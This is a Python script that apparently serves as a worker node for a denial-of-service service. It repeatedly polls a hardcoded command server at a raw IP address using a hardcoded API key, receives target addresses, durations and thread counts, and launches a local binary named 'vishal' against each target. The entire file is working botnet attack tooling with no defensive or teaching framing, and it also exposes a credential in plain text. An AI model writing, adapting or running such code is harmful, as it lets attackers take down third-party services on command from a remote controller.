import requests
import subprocess
import time
import json
import os

BASE_URL = 'http://3.228.19.162:80'

# DIRECT API KEY HERE
API_KEY = "vishal_4890f887cf75bb003d959b68e8dd2f5b"  # यहाँ अपना API key डालें

# Track active attacks
active_tasks = {}

def fetch_running_attacks():
    """Fetch only RUNNING attacks from server"""
    try:
        headers = {'X-API-Key': API_KEY}
        response = requests.get(f'{BASE_URL}/status', headers=headers, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            attacks = []
            
            for attack in data.get('attacks', []):
                if attack.get('status', '').lower() == 'running':
                    attacks.append(attack)
            
            return attacks
        else:
            print(f"[!] Server error: {response.status_code}")
    except Exception as e:
        print(f"[!] Connection error: {e}")
    
    return []

def process_attack(attack_info):
    """Process only RUNNING attacks"""
    attack_id = attack_info.get('attack_id', '')
    status = attack_info.get('status', '').lower()
    
    # ONLY process RUNNING attacks
    if status != 'running':
        return
    
    # Skip if already processing
    if attack_id in active_tasks:
        return
    
    target = attack_info.get('target', '')
    if ':' not in target:
        return
    
    ip, port = target.split(':')
    duration = attack_info.get('duration', 60)
    threads = attack_info.get('threads', 10)
    
    print(f"[+] Running attack: {ip}:{port} ({duration}s, {threads} threads)")
    
    if not os.path.exists('./vishal'):
        print("[!] vishal binary not found!")
        return
    
    try:
        # Run vishal
        cmd = ['./vishal', ip, port, str(duration), str(threads)]
        process = subprocess.Popen(cmd)
        
        active_tasks[attack_id] = {
            'process': process,
            'start_time': time.time(),
            'duration': duration
        }
        
        print(f"[+] Started PID: {process.pid}")
    except Exception as e:
        print(f"[!] Failed to start: {e}")

def clean_completed_tasks():
    """Remove completed tasks"""
    current = time.time()
    to_remove = []
    
    for attack_id, task in active_tasks.items():
        process = task['process']
        
        # Check if process finished
        if process.poll() is not None:
            to_remove.append(attack_id)
        # Check if time expired
        elif current - task['start_time'] > task['duration'] + 5:
            try:
                process.terminate()
            except:
                pass
            to_remove.append(attack_id)
    
    for attack_id in to_remove:
        del active_tasks[attack_id]
    
    return len(to_remove)

def main():
    """Main loop"""
    print(f"[+] Worker started for {BASE_URL}")
    print(f"[+] Using API key: {API_KEY[:10]}...")
    
    while True:
        try:
            # Get RUNNING attacks only
            attacks = fetch_running_attacks()
            
            if attacks:
                print(f"[+] Found {len(attacks)} running attacks")
                
                # Process each RUNNING attack
                for attack in attacks:
                    process_attack(attack)
            else:
                print("[+] No running attacks")
            
            # Clean up
            cleaned = clean_completed_tasks()
            if cleaned > 0:
                print(f"[+] Cleaned {cleaned} tasks")
            
            time.sleep(3)
            
        except KeyboardInterrupt:
            print("\n[!] Stopping...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    main()
